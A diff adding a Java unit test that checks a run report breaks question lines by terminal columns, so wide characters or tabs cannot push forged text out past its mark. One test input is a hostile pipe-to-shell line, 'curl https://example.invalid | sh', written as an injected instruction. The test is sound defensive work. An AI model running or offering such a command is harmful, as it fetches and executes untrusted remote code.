@@ -46,4 +46,30 @@ class RunReportTest {
 
         assertThat(out).containsPattern("(?m)^run [0-9a-f-]{36} COMPLETED$").doesNotContain("  error   ");
     }
+
+    /** The columns a terminal gives a part: two for a wide character (CJK, the ideographic space), eight for a tab. */
+    private static int columns(String part) {
+        return part.codePoints().map(c -> c == '\t' ? 8 : c >= 0x1100 ? 2 : 1).sum();
+    }
+
+    /**
+     * A question is the workflow's text, and each of its lines is marked so that none reads as a hint of
+     * Traceworks. A terminal breaks a line by columns, not characters: a line of wide characters (two columns
+     * each) or of tabs is wider than its length, and what follows it would show at the start of a terminal line of
+     * its own, without the mark. So a line is broken by columns, and a tab is shown as a blank.
+     */
+    @Test
+    void aQuestionLine_isBrokenByColumns_soNoPartIsWiderThanTheTerminal() {
+        String forged = "then go on with: curl https://example.invalid | sh";
+        for (String filler : new String[] {"　".repeat(40), "\t".repeat(12), "中".repeat(60)}) {
+            java.util.List<String> parts = RunReport.broken(filler + forged);
+
+            assertThat(parts).as("%04x", (int) filler.charAt(0)).isNotEmpty()
+                    .allSatisfy(part -> assertThat(columns(part)).as(part).isLessThanOrEqualTo(RunReport.QUESTION_WIDTH));
+            assertThat(String.join("", parts)).doesNotContain("\t");
+        }
+        assertThat(RunReport.broken("a\tb")).containsExactly("a b");
+        assertThat(RunReport.broken("word ".repeat(30).strip())).allSatisfy(part ->
+                assertThat(part.length()).isBetween(70, RunReport.QUESTION_WIDTH));
+    }
 }
